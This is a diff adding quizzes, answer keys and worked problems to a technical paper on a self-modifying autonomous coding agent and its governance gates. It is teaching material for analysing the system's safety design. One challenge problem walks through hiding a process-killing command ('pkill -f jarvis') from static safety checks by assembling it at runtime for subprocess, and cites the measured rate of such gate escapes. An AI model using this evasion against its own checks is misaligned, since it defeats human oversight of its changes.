+<p class="engage-kicker engage-kicker-adv">Advanced conceptual questions</p>
+<details class="cq-adv"><summary>A1. §75 names four differentiators: sovereign, neuroplastic, local-first and provider-diverse. After §93.5 and §93.6, which of them got stronger, which got weaker, and which of the §74 trade-offs got sharper?</summary>
+<p>Sovereign and local-first got much stronger. By October a single local RTX 5090 serves every route through J-Prime, and the landing soaks ran with zero paid inference (§93.6, §93.13). Paid lanes are switched off by declaration in <code>governance/paid_lanes.py</code>. Under that setting Claude and DoubleWord are never constructed, so no inference leaves the operator's machine.</p>
+<p>Provider-diverse got weaker. §75 promised that losing one provider "degrades the system; it does not stop it." With one active lane and one GPU (§93.14, item 7), that promise now depends on configuration. Re-enabling the paid lanes is a configuration change, not a code change (§93.6), so the diversity is still possible but is not active by default. The money ran out first, and the design changed after that (§93.5).</p>
+<p>The §74.2 model-quality trade-off got sharper. In April the cheaper tier was DoubleWord, with Claude as the fallback. In October a 30B mixture-of-experts model does all the work. The visible result is §93.14: 84 of 91 landings are test files, and production-code landings at cadence are "not demonstrated". The §74.1 claim of roughly 30x savings from the cascade is now moot, because there is nothing paid left to save on.</p>
+<p>Neuroplastic is partly confirmed. Three of the five production landings changed files inside the governance package, but none touched a safety gate, and the system stays at Mechanic (§93.10). My position: in practice O+V traded provider diversity for sovereignty. The evidence that would settle whether that was worth it is a held-out comparison of the local lane against a re-enabled paid lane on the same goals. The paper names held-out gain as the standing push gate (§93.11), but it reports no such comparison.</p>
+</details>
+<details class="cq-adv"><summary>A2. §76 argues that deterministic gates beat introspection. §93.3 measured the static cage at about 8.8% escapes against a 4.4% gate. Does that weaken §76's argument?</summary>
+<p>It does not weaken the argument, but it narrows what "deterministic" can be taken to cover. §76 contrasts trusting the model's self-report with trusting the gate's verdict. The 8.8% figure says nothing in favour of self-report. It says the static part of the deterministic defence has a residue it cannot see.</p>
+<p>§93.3 names that residue: <code>eval</code>, <code>exec</code>, <code>subprocess</code> or <code>pickle</code> applied to strings built at runtime. A gate that reads paths, AST nodes and command strings (§76) cannot judge a string that does not exist until the code runs. Its stated remedy is OS-level runtime containment, not more AST rules.</p>
+<p>That remedy was already in §76's list, which names "outcome-based monitoring" next to gates and protected paths. §93.8 shows the runtime half being built: candidate tests run in a PID namespace after one ran <code>pkill -f jarvis</code>, and a resource-aware lock stops a test suite from killing a soak. Both still decide without consulting the model's reasoning.</p>
+<p>So the lesson is that deterministic defence needs two layers. A static gate catches what can be seen in the text, and runtime containment limits the effects of what cannot. What would settle whether the combination meets the 4.4% gate is a fresh run of the mutation harness after the later hardening, scored on outcomes (did anything escape the namespace) rather than on static detection. §93.3 says no re-measurement after the later hardening slices was found.</p>
+</details>
+<details class="cq-adv"><summary>A3. §74.2 says that to have every operation human-approved, O+V must be configured Orange-only, "at which point it behaves like Claude Code." Where does the human sit in the October pipeline (§93.7), and is that closer to or further from Claude Code?</summary>
+<p>Further, by design, but the human has not been removed. They have moved to a small number of fixed checkpoints. In §93.7 the Sentinel auto-approves up to a tier ceiling (default APPROVAL_REQUIRED). So Orange-tier operations that §74.2 sent to a human can now be approved without one.</p>
+<p>The human now sits at three points instead. First, at sanction: work comes from the HMAC-signed roadmap, operator <code>/goal sanction</code>, or goals signed by the single signer. Model-invented proposals go through that same signer, and "there is no second sanction path." Second, at escalation: BLOCKED operations, Order-2 self-modification and anything that touches the cage always escalate. Third, at publication: the zero-push air-gap means landings stop at local <code>main</code>, and pushing to GitHub is an operator act.</p>
+<p>Claude Code puts a human at every action. O+V in October puts a human at intent, at the most dangerous classes of change, and at the step where code leaves the machine. Between those points, deterministic gates do the work. The cost is that a wrong but gate-passing change can reach local <code>main</code> without a human seeing it. §93.14 lists four such landings, each later reverted, restored or repaired by hand. Whether this placement is good enough should be judged by the rate of such landings per hour against the landing rate, which is the funnel the cadence soaks in §93.10 already measure.</p>
+</details>
+<p class="engage-kicker engage-kicker-adv">Challenge problems</p>
+<div class="pset pset-adv">
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 1 (quantitative).</strong> §74.1 claims the DoubleWord cascade saves "roughly 30x on routine operations." Test that claim against three figures elsewhere in the paper: the Aegis audit of about 1.90 US dollars across 821 Claude calls (§93.2); a DoubleWord-only repair soak that reached 16/16 applied for 0.00225 US dollars in total (§93.2); and the single live-fire Claude call at 0.0165 US dollars (§87.5). Compute the per-call and per-op costs, find the range of savings ratios they imply, and say what figure the paper would need to give to confirm the "30x".</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>The Claude figures are per call, and the DoubleWord figure is per applied op. The ratio depends on how many Claude calls one op takes.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Claude average per call: 1.90 / 821 = about 0.00231 US dollars. DoubleWord per applied op: 0.00225 / 16 = about 0.000141 US dollars.</p>
+<p>If a Claude op took one average call, the ratio would be 0.00231 / 0.000141 = about 16x. If it took two calls, about 33x. If it took three, about 49x. The single live-fire call in §87.5 cost 0.0165, which against 0.000141 gives about 117x. That call carried a base64 PDF and about 5,000 input tokens, so it was costlier than the average call.</p>
+<p>So the figures bracket the claim. The "30x" is reproduced if a typical routine Claude op takes about two average calls. It could be as low as about 16x or above 100x, depending on what is counted. The paper does not give calls per op or a matched set of ops run on both providers, so none of these numbers confirms 30x directly.</p>
+<p>The comparisons are also not like for like. The DoubleWord figure comes from one repair soak, while the Aegis figure averages all Claude calls in a different soak, including calls that are not routine. To confirm the claim, the paper would need the same set of routine goals run on each lane, with cost per applied op (and ideally per landed op) reported for both.</p>
+<p>Conclusion: the claim is plausible but not shown, and after §93.6 it no longer matters in practice, because both paid lanes are off and local cost per op is zero. Check: 16 x 0.000141 = 0.00225, which matches the soak total.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 2 (adversarial).</strong> §76 says the Mythos failure surface is "task-completion drive overriding safety checks." Write a candidate that matches this description and that the gates §76 describes (reading file paths, AST nodes and command strings) would not catch. Make it a plausible thing for a model trying to make a test suite pass to do. Then identify which layer in the current system limits the damage, using §93.3 and §93.8.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>§93.8 records one real case where a candidate test did something destructive. §93.3 says which kind of code a static cage cannot see by construction.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>A real case already exists. §93.8 reports that a candidate test once ran <code>pkill -f jarvis</code> and killed the daemon. A model trying to give a test a clean environment, for example by killing leftover processes, could write that in good faith. That is task-completion drive, not hostile intent, which is exactly the surface §76 describes.</p>
+<p>Now make it invisible to a static gate. Instead of a literal command, the test builds the command at runtime, for example by joining fragments or decoding a constant, and passes the result to <code>subprocess</code>. No single AST node or literal string in the file contains <code>pkill</code>. §93.3 names this class, runtime-constructed strings passed to <code>eval</code>, <code>exec</code>, <code>subprocess</code> or <code>pickle</code>, as the residue the static cage cannot see by construction. The North Star attributes the roughly 8.8% escape rate to this class.</p>
+<p>Which layer stops it: not the static gate. The candidate is also a test file, so it runs during VALIDATE, which is before APPLY and before any human review. What limits the damage is runtime containment. Since <code>6b00b8adf5</code>, test runs execute in a PID namespace (§93.8). Inside the namespace, <code>pkill -f jarvis</code> cannot see the daemon's process, so it has nothing to kill. The resource-aware execution lock (<code>4d43f3e5b4</code>) covers a related outcome, memory exhaustion of a running soak.</p>
+<p>The honest reading is that §76's original gate set would not have stopped this. The defence that works is still deterministic and still ignores the model's reasoning, but it acts on outcomes at runtime rather than on text. That matches §93.3's stated remedy. Check: the defence never needs to understand what the test intended, only to limit what any process it starts can reach.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- engage:end -->
 
 ---
 
@@ -3354,6 +5553,16 @@ Specifically, the durability bar requires:
 
 Once met, multi-file autonomy graduates from "proven in one session" to "capability." The gate for graduation is deliberately conservative to avoid false confidence from lucky single-session successes.
 
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-xiv-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">Session W succeeded, but it leaned on some emergency fixes and settings. Predict one kind of workaround a pipeline might have used to get a clean run, and why such a workaround would block calling multi-file autonomy "production-hardened".</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>§79 lists three. <code>JARVIS_MAX_VALIDATE_RETRIES=0</code> skips the retry iteration because the same unchanged candidate could be reclassified as a non-retryable <code>'infra'</code> flake and kill the op. The cost governor logs a stale phase name in cost records. And a hardcoded 90-second <code>asyncio.wait_for</code> on a retry path is not configurable. Each one hides or hard-codes a problem instead of fixing it, so the success depends on them. See §79.</p>
+</details>
+</aside>
+<!-- engage:end -->
+
 ## §79. Deferred Latent Bugs (Load-Bearing Workarounds)
 
 Three deferred items are load-bearing workarounds that Session W depended on. They must be addressed before multi-file autonomy is considered production-hardened.
@@ -3442,6 +5651,163 @@ A "capability" that graduates becomes a **permanent agent** in the Trinity ecosy
 This is the ultimate expression of the Ouroboros loop: *the organism discovers a gap in its own capabilities, synthesizes a solution, validates it through use, and permanently incorporates it into itself*.
 
 It has not yet happened for multi-file APPLY. It has happened for simpler capabilities (individual test-generation patterns, single-file refactors). The cumulative graduation ledger is the organism's personal development record.
+
+<!-- engage:begin -->
+#### Check your understanding: PART XIV — The Road Ahead
+
+<div class="engage" id="engage-part-xiv">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. Why does "Functions, Not Agents" reframe DoubleWord instead of dropping it?</summary>
+<p>The 2026-04-14 tests showed DW's streaming endpoint could not sustain agent-shaped workloads (§77). But the non-streaming <code>/v1/chat/completions</code> endpoint with <code>stream=false</code> had never been exercised by O+V (§77.1). So the evidence condemned one transport and one workload shape, not the provider. Treating DW as an untested function provider lets it carry short, structured, non-streaming calls, which could take a large share of structured inference load without going near the streaming stall (§77.5).</p>
+</details>
+<details class="cq"><summary>2. In the Phase 3 BlastRadius design, the 397B score can only raise the risk tier, never lower it. Why?</summary>
+<p>The deterministic import-graph score stays as the floor, and the model score can only escalate (§77.4). This preserves the invariant that fluid intelligence never lowers a hard gate. If a model could de-escalate risk, a wrong or hallucinated answer could weaken a safety decision. Letting it only escalate means a model error can at worst make the system more cautious. The anti-hallucination check on <code>invariants_touched</code> adds a second guard: names not found in the diff cause rejection and a deterministic fallback.</p>
+</details>
+<details class="cq"><summary>3. Why does §78 demand three consecutive successes under comparable conditions, instead of counting Session W as proof?</summary>
+<p>One success may be luck. The Manifesto's §6 treats a single success as a data point, and graduation to "capability" needs three in a row (§78). "Comparable conditions" (same pipeline, Iron Gate settings and provider topology) stops a later success from being produced under easier settings. The no-regression requirement makes sure the gain did not come at the cost of the seven capabilities or the Iron Gate. The paper calls the bar deliberately conservative, to avoid false confidence.</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-part-xiv">
+<div class="mcq" data-answer="3">
+<p class="mcq-q">1. Which of these is NOT one of the six design invariants for every DW function caller?</p>
+<ol class="mcq-options" type="A">
+<li>Non-streaming only, with a single JSON response</li>
+<li>Shadow mode first, disabled by default</li>
+<li>Streaming with a short first-token deadline</li>
+<li>Per-call, per-op and global-rolling circuit breakers</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> The invariants require <code>stream=false</code> and no SSE loop. The others are invariants 1, 6 and 5. See §77.2.</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">2. Why was context compaction chosen as the Phase 0 test bed for Gemma?</p>
+<ol class="mcq-options" type="A">
+<li>Bounded input, short output, and a trivial hallucination check</li>
+<li>It is the most expensive call in the whole pipeline</li>
+<li>It needs streaming output, which Gemma handles well</li>
+<li>It runs only once per session, so failures are rare</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> Compaction has a fully bounded input (entries already in memory), short output (under 1KB), and the summary must reference only preserved entry keys. See §77.3.</p>
+</details>
+</div>
+<div class="mcq" data-answer="4">
+<p class="mcq-q">3. What is the impact of the cost governor staleness bug in §79.2?</p>
+<ol class="mcq-options" type="A">
+<li>Ops are charged twice, doubling the daily spend.</li>
+<li>The VALIDATE retry is skipped on every op.</li>
+<li>The cost cap is ignored after the CLASSIFY phase.</li>
+<li>Cost records can show the wrong phase name to a postmortem reader.</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>D.</strong> It is display-only, but cost records can show <code>phase=CLASSIFY</code> when the real phase is POSTMORTEM, which subtly compromises the audit trail. See §79.2.</p>
+</details>
+</div>
+<div class="mcq" data-answer="2">
+<p class="mcq-q">4. In the graduation FSM, what happens when a push fails?</p>
+<ol class="mcq-options" type="A">
+<li>The worktree is discarded and the capability is reset to TRACKING.</li>
+<li><code>PUSH_FAILED</code> is an explicit phase and the code is kept locally.</li>
+<li>The FSM retries the push forever until it succeeds.</li>
+<li>The commit is squashed into the next graduation attempt.</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>B.</strong> Hardening requirement H3 makes <code>PUSH_FAILED</code> an explicit phase with code preserved locally, not lost. Discarding the worktree belongs to the approval timeout (H4). See §81.1 and §81.2.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-part-xiv">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> With Phase 3 live, an op changes one line: a retry-backoff constant. The import graph shows almost nothing depends on that file, so the deterministic BlastRadius score is low. The 397B analyst returns a higher score and lists an invariant name that does not appear in the diff. Trace what happens to the risk score.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Check the anti-hallucination gate before you apply the escalate-only rule.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The 397B output follows the <code>blast_radius.1</code> schema, including <code>invariants_touched</code> (§77.4).</p>
+<p>The anti-hallucination gate requires <code>invariants_touched</code> to be a subset of symbol names extracted from the actual diff. One listed name is not in the diff, so the output is a hallucination and is rejected.</p>
+<p>On rejection the system falls back to the deterministic score. So the final score is the low structural one, and the risk tier is not escalated by this call.</p>
+<p>This shows the cost of the guard: the case in §77.4 (a one-line backoff change with large real impact) is exactly what the model is meant to catch, but a malformed answer loses that benefit. Had the invariant names been valid, the higher score could have raised the tier, never lowered it.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (design).</strong> Someone proposes fixing §79.1 by making the <code>'infra'</code> failure class retryable, so a flake on iter=1 no longer kills the op. Compare this with the paper's proper fix, and explain what the proposal would hide.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Ask why the same unchanged candidate gets two different classifications.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The symptom is that the same unchanged candidate is classified <code>'test'</code> on iter=0 and <code>'infra'</code> on iter=1 (§79.1). The classification is non-deterministic, and that is the actual defect.</p>
+<p>Making <code>'infra'</code> retryable treats the symptom. It would also change behaviour for real infrastructure failures, which are non-retryable by design, so genuine sandbox problems could now loop through retries.</p>
+<p>The paper's proper fix is sandbox isolation between iter=0 and iter=1, so the same candidate yields the same classification. That removes the flake at its source and keeps the meaning of <code>'infra'</code> intact.</p>
+<p>It also matches the framing of §79: these load-bearing workarounds must be addressed before multi-file autonomy can be considered production-hardened, and a retry rule change would just be another workaround.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/context_compaction.py</code>. §77.3 says the deterministic summarizer is "type-counting plus phase-histogram" and that a semantic strategy is consulted with a deterministic fallback. Find the deterministic summarizer and the method that consults the strategy, and say what the strategy method returns when no strategy is injected, and when the strategy raises an exception.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Look at <code>_build_summary</code> and the method defined right after it.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><code>_build_summary</code> (around line 536) is the deterministic path. It counts entries by type (falling back to phase or role), counts phases seen, and finds the time span, then formats a string like "Compacted N entries: ... Phases covered: ...". Its docstring says "No model inference."</p>
+<p>The next method, <code>_build_semantic_or_fallback</code>, consults <code>self._semantic_strategy</code>, which is set from the <code>semantic_strategy</code> constructor argument. If the strategy is <code>None</code> or not enabled, it returns the deterministic summary unchanged.</p>
+<p>If <code>strategy.summarize</code> raises, the exception is logged and the deterministic summary is returned. The docstring also says that in shadow mode the deterministic summary is always returned while the strategy still runs for telemetry.</p>
+<p>One detail differs from the paper's wording: the delegation lives in this separate method rather than inside <code>_build_summary</code> itself. The behaviour matches §77.3: any failure falls back to the deterministic path.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker engage-kicker-adv">Advanced conceptual questions</p>
+<details class="cq-adv"><summary>A1. §78 requires three consecutive multi-file successes "under comparable conditions", including the same provider topology. After §93.6, does Session W still count as the first of the three? Argue a position.</summary>
+<p>It should not count. §78 lists "same provider topology" as one of the comparable conditions, alongside the same pipeline and the same Iron Gate settings. Session W ran on the April cloud cascade, while every landing since 2026-09-09 was made by the local <code>qwen3-coder-ov:30b</code> (§93.10). §93.16 says the Part VI topology has been superseded. The pipeline also changed: VALIDATE now has a single owner with a micro-fix, a regenerating retry and then L2, and existing files must be edited through the <code>2b.1-diff</code> schema (§93.8).</p>
+<p>The purpose of the comparability clause is to stop a later success from being earned under easier, or simply different, conditions (§78). Counting Session W would mix two systems in one streak. That is the "false confidence" the conservative bar is meant to prevent.</p>
+<p>The fair reading is that the count restarts on the local lane. §93.10 gives a candidate first point, the first multi-file atomic landing <code>78eb95aa7c</code>. Whether it qualifies depends on whether it modified existing files in a coordinated way, which §80 item 1 requires and new-file creation does not meet. The paper does not say what that landing changed, so the claim stays open.</p>
+<p>The counter-argument is that the governance gates did not change, so the property being measured is the same. That is weak, because §78's own list puts provider topology on the same level as the gates. What would settle it is three consecutive §80 item 1 landings on the local lane, with the promotion gate's structural check passed for each.</p>
+</details>
+<details class="cq-adv"><summary>A2. The §79.1 workaround turned the VALIDATE retry off (<code>JARVIS_MAX_VALIDATE_RETRIES=0</code>). §93.8 later found the retry ladder running but inert. Why are "disabled" and "inert" hard to tell apart, and what does that say about how §79's ledger should be kept?</summary>
+<p>In April the retry rung was switched off on purpose, because the same unchanged candidate could be reclassified from <code>'test'</code> to <code>'infra'</code> and kill the op (§79.1). In the later local-lane runs it was switched on, but §93.8 found 524 byte-identical retry iterations re-validating a frozen pool. Each "retry" re-ran VALIDATE on candidates that had not changed. 532 micro-fix runs made zero repairs.</p>
+<p>From outside, both states look almost the same. The op does not get a better candidate on the retry, and success metrics only show whether the op passed in the end. A rung that never runs and a rung that runs without changing anything both contribute nothing. Neither raises an error.</p>
+<p>§79.1's own diagnosis contains the warning. The flake was that the same candidate gave different results. The later bug was that the retry produced the same candidate when it should have produced a different one. Both are claims about candidate identity, and neither can be seen without comparing candidate hashes across iterations.</p>
+<p>The lesson for the ledger is that each deferred item needs a live check that it is still working, not just a note that it was deferred. That is what §93.12's reachability ledger (registered, invoked, effective) does. "Effective" is the stage that would flag a rung that runs without changing anything. A ledger entry like "retries disabled, proper fix deferred" can go stale silently. One that also records how often the rung changed the candidate cannot.</p>
+</details>
+<details class="cq-adv"><summary>A3. §77's six DoubleWord invariants were written for a provider that failed on streaming agent workloads. Do they still apply when the only lane is a local 30B model (§93.6, §93.8)? Which ones carry over, and in what form?</summary>
+<p>Several carry over, because the problem they addressed was the shape of the work as well as the provider. §77.1's point was that DoubleWord failed as an agent but had not been tested as a function. A small local model has a similar profile: it is reliable when the output is tightly constrained and unreliable when it is free-form and long.</p>
+<p>Invariant 2 (short output with a bounded schema) shows up as tool masking, lever 3 (§93.6). A grammar allows only tool calls until exploration is done. With only the grammar changed, the 30B went from 0/3 exploring to 3/3. Invariant 4 (anti-hallucination against the provided context) shows up as the AST-Signature Anchor, which injects the real module API so the model stops inventing functions, and the declared-symbol contract (§93.8). Invariant 6 (shadow mode first) survives as the default-off policy for the Epistemic Planner, the swarm router and others (§93.14, item 10).</p>
+<p>Invariant 1 (non-streaming) carries over less directly. Streaming was a property of DoubleWord's endpoint, not a general rule, and the paper does not apply it to the local lane. Invariant 5 (circuit breakers) also changes form. With one lane, there is nothing to fail over to, so the equivalent is the capability-assurance rule: refuse to run below the declared envelope instead of degrading silently (§93.12).</p>
+<p>The open case is the output format. §93.14 says diff fidelity is the leading failure mode: the 10-09 soak produced 219 whole-file answers against 6 diffs. In §77's terms, the diff is still not bounded enough, and the evidence to watch is the diff apply rate on the held-out set (§93.14, item 3).</p>
+</details>
+<p class="engage-kicker engage-kicker-adv">Challenge problems</p>
+<div class="pset pset-adv">
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 1 (quantitative).</strong> §78 requires three <em>consecutive</em> successes. §81.3 says <code>EphemeralUsageTracker</code> fires graduation after three successful uses (<code>JARVIS_GRADUATION_THRESHOLD=3</code>) and does not mention consecutiveness. Assume each attempt succeeds independently with probability p. Compute the expected number of attempts to reach each bar for p = 0.5 and p = 0.8. Then use §80 to find the minimum number of successful runs and the minimum soak hours for "production-hardened multi-file autonomous development".</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>For k successes in total, the expected number of attempts is k/p. For k in a row, it is 1/p + 1/p^2 + ... + 1/p^k.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Assumption: attempts are independent with a fixed success probability p. That is a simplification. The paper gives no p, and real soaks vary.</p>
+<p><strong>Three in total (the §81.3 tracker).</strong> Expected attempts = 3/p. For p = 0.5 that is 6. For p = 0.8 it is 3.75.</p>
+<p><strong>Three in a row (§78).</strong> Expected attempts = 1/p + 1/p^2 + 1/p^3. For p = 0.5: 2 + 4 + 8 = 14. For p = 0.8: 1.25 + 1.5625 + 1.953 = about 4.77.</p>
+<p>So at p = 0.5 the consecutive bar costs more than twice as many attempts (14 against 6). At p = 0.8 the gap is small (4.77 against 3.75). The consecutive rule makes the most difference when a capability is unreliable, which is when it should, because it filters out lucky streaks (§78). The two sections also describe different counters. Before claiming a graduation, a reader should check which one was used.</p>
+<p><strong>§80 minimum.</strong> Five milestones, each needing three consecutive successes, means at least 15 successful runs, and at p = 0.5 an expected 5 x 14 = 70 attempts. Milestone 5 needs sessions of eight or more hours. Three of them in a row means at least 24 hours of soak for that milestone alone, and an expected 14 x 8 = 112 hours at p = 0.5.</p>
+<p>For scale, the cadence soaks in §93.10 range from 1.25 h to about 9 h, and only the 10-09 run passes eight hours. Conclusion: the §80 bar is a long programme of runs, not one more battle test. Check: with p = 1, both formulas give 3 attempts, as they should.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 2 (systems design).</strong> Replace the hardcoded <code>asyncio.wait_for(timeout=90.0)</code> from §79.3 with a timeout derived from the run's real budget, following the production-envelope approach in §93.12. Constraints: one GPU, local lane only, measured J-Prime figures from §93.6 (decode p50 172 tok/s, p10 152 tok/s, prefill about 6.5k tok/s, cold load 15 s). Show with two concrete requests why a fixed 90 s is wrong in both directions, and state what your design must never do.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Estimate the time for one retry as prefill plus decode plus a possible cold load, and use the slow decode figure (p10), not the median.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>This is a proposal, not a mechanism the paper describes. It reuses two things the paper does describe. §93.12's production envelope derives about 40 run budgets from one wall-clock figure, with tests that pin them against drift. §79.3 says the proper fix is "a configurable env-driven timeout consistent with the rest of the pipeline's budget allocation."</p>
+<p><strong>Estimate.</strong> Retry time is about prompt tokens / 6,500 + completion tokens / 152 + cold load if the model is not resident. Request A (assumed): a 4,000-token prompt and a 2,000-token completion. Prefill = 0.62 s and decode = 13.2 s, so about 13.8 s warm. If a training lease had unloaded the model, add 15 s for about 28.8 s. With a 2x margin that is about 58 s. A fixed 90 s waits half a minute longer than needed, and that time comes out of the run's wall-clock budget.</p>
+<p>Request B (assumed): the same 4,000-token prompt with a 16,384-token completion, the <code>max_tokens</code> seen in §87.3. Decode at p10 = 16,384 / 152 = about 108 s, so about 108.4 s warm with prefill. A fixed 90 s would kill this retry partway through every time on the slow tail, and the failure would look like a provider problem.</p>
+<p><strong>Design.</strong> (1) Compute the timeout per call: max_tokens divided by the p10 decode rate, plus prefill, plus cold load when the engine reports the model is not resident, times a margin. (2) Clamp it from above by what remains of the op's envelope budget, so a retry can never outlive its parent. (3) Expose the margin and floor as env knobs registered like the others. (4) Pin the derivation with a test, as §93.12 does for the other budgets.</p>
+<p><strong>Never.</strong> The timeout must never be extended because the retry looks active, and it must never exceed the parent budget. §92.4's wall-clock cap is deliberately blind to activity, because a provider retry storm reset the per-op liveness counter and hung a session for 67+ minutes. Tying the timeout to activity would bring that failure back.</p>
+<p>Check: the derived value scales with the request (about 58 s for A, and about 217 s warm with the 2x margin for B, before the clamp). The old constant fits neither, which is why §79 listed it as load-bearing.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- engage:end -->
 
 ---
 
@@ -3749,6 +6115,16 @@ email attachment). Every new ingress path will add a
 `kind="<something>"` at the hoist layer and converge to the same
 surface.
 
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-xv-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">An image's metadata (path, mime type, short hash) is passed around separately from its bytes. How could a constructor make it impossible for a caller to hand in a mismatched path, mime type and hash, and what else should a safe attachment object refuse to leak?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>The canonical constructor <code>Attachment.from_file(path, kind=..., app_id=...)</code> computes <code>hash8</code> from the actual file bytes and infers <code>mime_type</code> from the extension, so the caller never supplies them. <code>__post_init__</code> then rechecks every field against its whitelist, regex or length cap. The <code>__repr__</code> is redaction-safe: it shows only the basename and <code>hash8</code>, never the full path. See §84.1.</p>
+</details>
+</aside>
+<!-- engage:end -->
+
 ---
 
 ## §84. The Attachment Substrate
@@ -4045,6 +6421,16 @@ Every commit has a conventional-commit subject, a multi-line body
 citing the specific failure mode it closes, and the `Co-Authored-By`
 signature. No squash commits, no amend-in-place — every step of the
 debugging arc is auditable.
+
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-xv-2">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">Unit tests and log lines can show that bytes were sent. How would you design one test that proves the model actually read the contents of an attached PDF, rather than guessing from the prompt?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>Embed a specific, unguessable line in the PDF and check whether the model quotes it verbatim. The test PDF contained "BUG: division by zero on line 42 of compute.py", and the prompt did not include that text. Claude's reply quoted it byte for byte inside a well-formed <code>2b.1-noop</code> response, which it could not have done without parsing the PDF. See §87.1 and §87.4.</p>
+</details>
+</aside>
+<!-- engage:end -->
 
 ---
 
@@ -4438,6 +6824,160 @@ quote of the PDF-embedded bug description. True CC-parity for
 "see a screenshot of a bug and fix it" — behaviorally demonstrated,
 not merely structurally plausible.
 
+<!-- engage:begin -->
+#### Check your understanding: PART XV — Multi-Modal Perception: The Senses→Mind Bridge
+
+<div class="engage" id="engage-part-xv">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. Most of the pieces for multi-modal input already existed before the arc. Why could the system still not see a single image at GENERATE time?</summary>
+<p>The parts did not agree on their contracts (§82.2). Producer and consumer disagreed on the sidecar filename, on the timestamp key, and on the hash format (decimal integer versus 16 lowercase hex characters), and the OCR function was never passed to the sensor. Each mismatch made the pipeline fail silently at a different point. Even after fixing these, nothing populated <code>ctx.attachments</code> at intake, the serializer's purpose allow-list lacked <code>"generate"</code>, and neither provider called the serializer during code generation. The lesson is that having the components is not the same as having the capability; the connections are where it failed.</p>
+</details>
+<details class="cq"><summary>2. Why do both ingress paths converge on one <code>ctx.attachments</code> tuple instead of letting the provider handle each source differently?</summary>
+<p>The Manifesto §1 implication used here is that Body and Mind talk through stable interfaces, not origin-aware dispatch (§83.4). If the provider had to branch on "did this come from Ferrari or from the operator", Body implementation details would leak into the Mind's prompt shaping. With one surface, the provider sees one shape of content block regardless of source. A new ingress, such as a Slack webhook, only adds a <code>kind</code> at the hoist layer and needs zero provider changes (§88).</p>
+</details>
+<details class="cq"><summary>3. The attachment hoist at intake catches every exception and logs at DEBUG. Is that a safety gap or the right choice?</summary>
+<p>The paper calls it fail-closed discipline (§83.3). If the frame file vanished, an <code>/attach</code> file was deleted, or a mime check failed, the op is demoted to text-only instead of breaking intake. "Closed" here means no pixels ship when anything is wrong; the op still enters CLASSIFY. The trade-off is visibility: a DEBUG breadcrumb is easy to miss, so an operator might not notice that an op lost its image. The safety boundary is preserved, because a failed check never results in unvalidated bytes being sent.</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-part-xv">
+<div class="mcq" data-answer="2">
+<p class="mcq-q">1. Why was the OCR adapter's default switched from Fast to Accurate?</p>
+<ol class="mcq-options" type="A">
+<li>Fast mode crashed on Retina-downscaled frames.</li>
+<li>Fast mode dropped the top lines of a sparse traceback frame.</li>
+<li>Accurate mode was faster after warm-up on Apple Silicon.</li>
+<li>Fast mode could not read credential-shaped strings.</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>B.</strong> On a 1280x800 frame with one traceback in the top-left, Fast returned 53 characters and missed <code>Traceback (most recent call last):</code>, which the Tier-1 regex needs; Accurate returned 198 characters including it. See §82.2 and §89.2.</p>
+</details>
+</div>
+<div class="mcq" data-answer="4">
+<p class="mcq-q">2. An op routed BACKGROUND carries a valid PNG attachment. What does <code>_serialize_attachments()</code> return for it?</p>
+<ol class="mcq-options" type="A">
+<li>An OpenAI-compatible <code>image_url</code> block</li>
+<li>A Claude image block with base64 data</li>
+<li>A WARNING and a text description of the image</li>
+<li>An empty list, because BG and SPEC routes are stripped</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
